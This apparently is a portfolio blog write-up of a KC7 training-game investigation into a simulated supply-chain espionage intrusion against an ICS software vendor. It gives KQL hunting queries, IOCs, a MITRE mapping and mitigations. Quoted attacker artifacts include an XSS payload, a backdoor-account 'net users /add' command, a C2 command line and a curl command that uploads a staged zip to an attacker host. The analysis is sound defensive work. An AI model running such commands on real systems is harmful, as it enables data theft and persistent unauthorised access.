---
layout: post
title: "Operation DOCKSHOCK: Supply-Chain Intrusion & ICS Espionage"
date: 2026-06-22
categories: [threat-detection, dfir-portfolio]
tags: [Critical Infrastructure, Supply Chain]
focus: "Supply Chain Espionage, Source-Code Exfiltration"
type: "Case Study"
discipline: "Threat Detection Engineering"
source_name: "KC7 Cyber Detective Game"
source_url: "https://kc7cyber.com"
description: "Triaging a complex supply-chain intrusion targeting regional energy distribution. Tracks the complete lifecycle from perimeter XSS probing and weaponized phishing documents to lateral movement and source-code exfiltration using raw web utilities."
permalink: /blog/operation-dockshock.html
math: false
---

| Operation DOCKSHOCK | At a Glance |
|---|---|
| **Target Organization** | Solvi Systems: vendor of the DOCKS Industrial Control Systems (ICS) software |
| **Sector / Impact Zone** | Energy distribution across South Africa, Mozambique, Eswatini, Zimbabwe, and Namibia |
| **Attack Classification** | Multi-stage supply-chain espionage |
| **Incident Window** | May 1 – May 28, 2024 |
| **Initial Access Vector** | Spear-phishing link (MITRE T1566.002) |
| **Confirmed Impact** | Exfiltration of SDLC source-code blueprints (`CollectedData.zip`) |
| **Scope of Compromise** | 470 persistent C2 connections across 38 unique endpoints |
| **Investigated By** | Joshua Berkoh (Security Analyst II) · Report dated June 23, 2026 |

## Executive Summary

Between May 1 and May 28, 2024, a targeted, multi-stage cyber-espionage campaign successfully compromised **Solvi Systems**. Because Solvi Systems develops the proprietary **DOCKS Industrial Control Systems (ICS)** software which manages energy distribution networks across South Africa, Mozambique, Eswatini, Zimbabwe, and Namibia — this intrusion represented a severe regional critical-infrastructure supply-chain risk and a latent public-safety threat.

The adversary used initial web reconnaissance and defensive-evasion techniques to deliver targeted spear-phishing lures. After gaining initial access to a corporate operations endpoint, the actor established persistent Command-and-Control (C2) beaconing via custom malware (`ecobug.exe`), executed localized privilege escalation, and moved laterally into a customer-facing engineering role (Docks Customer Success). The operation culminated in the targeted collection, compression, and exfiltration of sensitive Software Development Lifecycle (SDLC) blueprints and product documentation — exposing downstream utility substations to potential future kinetic disruption.

## 1. Incident Timeline

*   **[May 01, 00:00 UTC]** ── Initial automated reconnaissance of DOCKS product documentation begins.
*   **[May 01, 15:51 UTC]** ── Phishing email delivered to Sales Rep Carla Wharton via twin typosquat infrastructure.
*   **[May 01, 15:57 UTC]** ── User executes the malicious link; `ecobug.exe` payload successfully dropped.
*   **[May 01, 17:38 UTC]** ── Outbound C2 persistence loop established over TCP/1337.
*   **[May 02, 16:50 UTC]** ── Privilege Escalation: local administrative backdoor account `gu@rd!an` created.
*   **[May 02 – May 27]** ── Dwell Window: adversary maintains a low-and-slow presence, evading standard detection.
*   **[May 27, 16:23 UTC]** ── Lateral Movement: execution on Alexei Petrov's system (Docks Customer Success).
*   **[May 27, 16:45 UTC]** ── Data Staging: SDLC documents copied from network shares and compressed to a local archive.
*   **[May 28, (subsequent)]** ── Data Exfiltration: staged `CollectedData.zip` sent out via native `curl.exe`.

## 2. Phase-by-Phase Technical Walkthrough

### Phase 1: Baseline Assessment & Perimeter Triage

The investigation initiated with an environment baseline analysis. The corporate headcount was validated at **500 employees**, and the core executive profile for Chief Technology Officer (CTO) Alexis Khoza was mapped out to identify potential high-value targeting.

```kql
// Query 1: Identifying the target profile of the CTO
Employees
| where role == "CTO"
```

{% include figure.html src="/assets/images/posts/operation-dockshock/s-1.png" alt="KQL Employees query result showing CTO Alexis Khoza, IP 10.10.0.7, hostname 7FVW-LAPTOP, and user-agent profile" caption="Figure 1: Employee query result identifying the CTO target profile." %}

```kql
// Query 2: Quantifying inbound communications to the executive tier
Email
| where recipient == "alexis_khoza@solvisystems.com"
| count
```

{% include figure.html src="/assets/images/posts/operation-dockshock/s-2.png" alt="KQL Email query result showing a count of 31 inbound emails to the CTO" caption="Figure 2: Inbound email count to the CTO — 31 messages identified." %}

**Result:** 31 inbound emails identified. Baseline network profiling also revealed that the threat actor was aggressively monitoring the domain, hunting for organizational context surrounding the docks-ics product string.

### Phase 2: Perimeter Reconnaissance & Web Exploitation (WAF Deflection)

On May 3, 2024, the Web Application Firewall (WAF) triggered a High-severity alert indicating an inbound Cross-Site Scripting (XSS) exploit attempt on the corporate feedback portal.

```kql
// Query 3: Isolating the WAF payload footprint in web logs
InboundNetworkEvents
| where url contains "alert"
| project timestamp, src_ip, user_agent, url, status_code
```

{% include figure.html src="/assets/images/posts/operation-dockshock/s-3.png" alt="Web log inbound event from 13.201.46.208 with a 404 error code and Opera/8.64 user-agent string" caption="Figure 3: Perimeter probe from 13.201.46.208 — 404 responses and an anomalous Opera/8.64 user agent." %}

*   **Attacker Payload:** `</script><script>alert('xss')</script>`
*   **WAF Mitigation Status:** Deflected. The web server responded with a 404 Status Code, preventing script execution.
*   **Attacker User Agent:** Opera/8.64.(X11; Linux x86_64; kok-IN) Presto/2.9.165 Version/10.00

Expanding the search window around this user agent exposed a cluster of **4 malicious IP addresses** (98.117.26.236, 13.201.46.208, 105.78.23.64, 56.6.30.190) executing **9 distinct exploitation requests** across a multi-day window. Passive DNS correlation tied these IPs to a deliberate **twin-typosquatting infrastructure** scheme engineered to mimic authentic industry communications:

*   **eco-awareness-updates.net** *(plural)* ── inbound mail-routing / phishing envelope domain.
*   **eco-awareness-update.net** *(singular)* ── backend API staging and exfiltration landing zone.
*   **news-on-industry.com** / **energy-trends4u.net** ── hosted file-delivery relays.

### Phase 3: Initial Access via Spear-Phishing

Deflected at the web perimeter, the adversary pivoted to a targeted phishing campaign. **56 malicious emails** were distributed across the network, specifically targeting roles managing the utility software tier.

```kql
// Query 4: Correlating adversary infrastructure to weaponized emails
let actor_ips = pack_array("98.117.26.236","13.201.46.208","105.78.23.64","56.6.30.190");
let adv_domains = PassiveDns | where ip in (actor_ips) | distinct domain;
Email
| where link has_any (adv_domains)
| order by timestamp asc
```

{% include figure.html src="/assets/images/posts/operation-dockshock/s-4.png" alt="Chronological table of phishing email deliveries highlighting the first successful delivery to Carla Wharton" caption="Figure 4: Phishing delivery timeline, with the first successful click by Carla Wharton." %}

The patient-zero entry vector occurred on **May 1, 2024, at 15:51:41 UTC**. Carla Wharton (cawharton), a Sales Representative on host JUSP-LAPTOP, received a weaponized lure:

*   **Sender:** news@eco-awareness-updates.net (Reply-To: electric_updates@gmail.com)
*   **Subject:** [EXTERNAL] Business Opportunity: Two major energy companies merging
*   **Lure Link:** [http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx](http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx)

At 15:57:41 UTC, endpoint records confirm that the user executed the link, triggering an immediate second-stage binary download via `explorer.exe`:

*   **Path:** C:\ProgramData\ecobug.exe
*   **SHA256 Hash:** 1c3ef0407d5714037504c52f7abfa86c081fd7a021b52e2abe8a669f92413252

### Phase 4: Command & Control (C2) & Local Persistence

At 17:38:25 UTC, ecobug.exe initiated its outbound connection architecture to stabilize access.

```kql
// Query 5: Identifying the C2 execution telemetry on the host
ProcessEvents
| where hostname == "JUSP-LAPTOP"
| where process_commandline contains "ecobug.exe"
```

{% include figure.html src="/assets/images/posts/operation-dockshock/s-5.png" alt="Process event log showing the ecobug.exe execution command line with destination and port flags" caption="Figure 5: Process log capturing ecobug.exe execution with C2 destination and port arguments." %}

*   **C2 Command Line:** ecobug.exe --timeout 6000 --dest 98.117.26.236 --port 1337
*   **Beaconing Signature:** The malware operated on a strict automated cadence, initiating an outbound connection over TCP Port 1337 exactly 1 time per day at 17:38:25.
*   **Scope of Compromise:** Expanding the beacon signature across the enterprise revealed 470 total persistent connections impacting 38 unique employee endpoints.

#### Privilege Escalation Block

Once active on JUSP-LAPTOP, the threat actor spawned localized commands to create an access bridge, provisioning a permanent local administrator backdoor:

```cmd
net users /add gu@rd!an abc1toothree
```

Following account creation, local asset discovery was conducted, concluding with the execution of the net use utility to parse mounted domain assets.

#### Dwell-Time Analysis & Visibility Gaps

Following the local-admin creation on May 2, the adversary entered a **25-day dormancy period**, staying alive through a single daily beacon until launching lateral actions on May 27. This extreme dwell time highlights a genuine operational visibility gap: because the implant communicated strictly via a predictable, low-volume baseline over a non-standard port, it slipped beneath legacy anomaly thresholds.

### Phase 5: Lateral Movement & SDLC Data Exfiltration

Using an identified variation in execution habit (net use /PERSISTENT:YES), the adversary moved laterally across the network segment on May 27, 2024, at 16:23:10 UTC, successfully compromising SJ9V-MACHINE. This host belonged to Alexei Petrov, the Docks Customer Success Manager. Because this customer-success profile directly handles downstream system integration and client deployment setups, it held extensive read access to development data shares.

The adversary immediately targeted the file share holding the core source configuration blueprints for the DOCKS ICS system:

```powershell
// Query 6: Tracking file accumulation and staging actions
ProcessEvents
| where hostname == "SJ9V-MACHINE" and process_commandline contains "Copy-Item"
```

{% include figure.html src="/assets/images/posts/operation-dockshock/s-6.png" alt="PowerShell command line copying network assets to a local C drive staging folder" caption="Figure 6: PowerShell staging command copying source assets to a local staging folder." %}

*   **Data Scrape Command:** Copy-Item -Path \\solvisystems.com\SharedDocs\SoftwareDevelopment\CycleDocuments\* -Destination C:\Users\alpetrov\CollectedData\Software_Cycle_Docs

The collected assets were compressed locally into `C:\Users\alpetrov\CollectedData\CollectedData.zip`. To prepare for exfiltration, the actor relocated this staging archive out of the user directory into a localized root path, renaming it to `C:\DataExfil\CollectedData.zip` to streamline programmatic access. Concurrently, the attacker compromised three distinct internal accounts to browse the developer intranet (devportal.solvisystems.com) and read the internal_process.pdf deployment documentation. The adversary even used compromised mailboxes to distribute phishing messages internally under urgent security headings (Urgent Request: DOCKS System Documentation) to gather structural details.

On May 28, 2024, the adversary leveraged `curl.exe` — a native utility that ships by default with modern Windows — as a **Living-off-the-Land Binary (LotLBin)** to bypass standard file-transfer protocol tracking, exfiltrating the source blueprint archive directly over an HTTP POST stream:

```kql
// Query 7: Catching the final data exfiltration process command
ProcessEvents
| where process_commandline contains "curl" and process_commandline contains "upload"
```

{% include figure.html src="/assets/images/posts/operation-dockshock/s-7.png" alt="Curl command performing a file POST to api.eco-awareness-update.net" caption="Figure 7: curl exfiltration — file POST to the adversary API node api.eco-awareness-update.net." %}

*   **Exfiltration Command Line:** curl -F 'file=@C:\DataExfil\CollectedData.zip' https://api.eco-awareness-update.net/upload

## 3. MITRE ATT&CK Matrix Mapping

| Tactic | Technique ID | Technique Name | Operational Context |
|---|---|---|---|
| Reconnaissance | T1592 | Gather Victim Host Information | Automated web scanning targeting the docks-ics documentation profile. |
| Initial Access | T1566.002 | Spearphishing Link | Lure distributed via twin typosquat infrastructure (eco-awareness-updates.net). |
| Execution | T1204.002 | User Execution: Malicious File | Recipient interaction launching the weaponized document download stream. |
| Command & Control | T1571 | Non-Standard Port | Custom beaconing loop established via ecobug.exe over TCP/1337. |
| Persistence | T1078.003 | Valid Accounts: Local Accounts | Creation of a localized administrative user profile (gu@rd!an). |
| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Network pivoting leveraging administrative validation tokens onto SJ9V-MACHINE. |
| Collection | T1074.001 | Data Staging: Local Data Staging | Consolidation of SDLC files into C:\DataExfil\CollectedData.zip. |
| Exfiltration | T1567 | Exfiltration Over Web Service | Exfiltration of core source blueprints via a native LotLBin (curl.exe) web POST. |

<!-- Section: Proactive Detection Engineering (Sigma & KQL rules) — to be added later, once the detections can be operationally justified. -->

## 4. Consolidated Indicators of Compromise (IOCs)

| Type | Indicator | Context / Association |
|---|---|---|
| SHA256 Hash | 1c3ef0407d5714037504c52f7abfa86c081fd7a021b52e2abe8a669f92413252 | Malicious payload binary (ecobug.exe) |
| IP Address | 98.117.26.236 | Primary Command-and-Control (C2) listener destination |
| IP Address | 13.201.46.208 | Initial Cross-Site Scripting (XSS) reconnaissance node |
| Domain | eco-awareness-updates.net | Phishing delivery envelope domain (plural typosquat) |
| Domain | eco-awareness-update.net | Exfiltration API routing target (singular typosquat) |
| Domain | news-on-industry.com | Malicious weaponized-document hosting relay |
| User Profile | gu@rd!an | Backdoor local administrative account profile |
| User Agent | Opera/8.64.(X11; Linux x86_64; kok-IN) Presto/2.9.165 Version/10.00 | Threat-actor reconnaissance browser footprint |

## 5. Strategic Defense & Mitigation Recommendations

Based on the multi-layer tactical breakdown of Operation DOCKSHOCK, the following Tier-2 defense architecture changes are mandated for deployment:

1.  **Network Architecture Micro-Segmentation (IT/OT Defenses):**
    Implement explicit network boundaries isolating the engineering software compilation zone (devportal.solvisystems.com and SharedDocs) from general corporate sales and operations tiers. Inter-zone file transfers must be gated behind multi-factor authorization proxies.
2.  **Strict Egress Application Whitelisting:**
    Block all outbound perimeter egress over arbitrary high ports (such as TCP/1337). Restrict command-line web automation utilities like curl and Invoke-WebRequest on user endpoints through AppLocker or an equivalent Endpoint Detection and Response (EDR) policy to halt automated exfiltration pipelines.
3.  **Local Administrator Restriction & Account Creation Monitoring:**
    Enforce a strict Local Administrator Password Solution (LAPS) framework. Deploy a high-severity alert rule in the SIEM targeting any localized command invocation containing the net user /add or localgroup administrators strings.
4.  **Credential Reset & Active Session Invalidation:**
    Force an immediate enterprise-wide password and active-session token reset for all compromised users (e.g., Carla Wharton, Alexei Petrov) and decommission the rogue local administrative profile gu@rd!an across all 38 impacted endpoints.
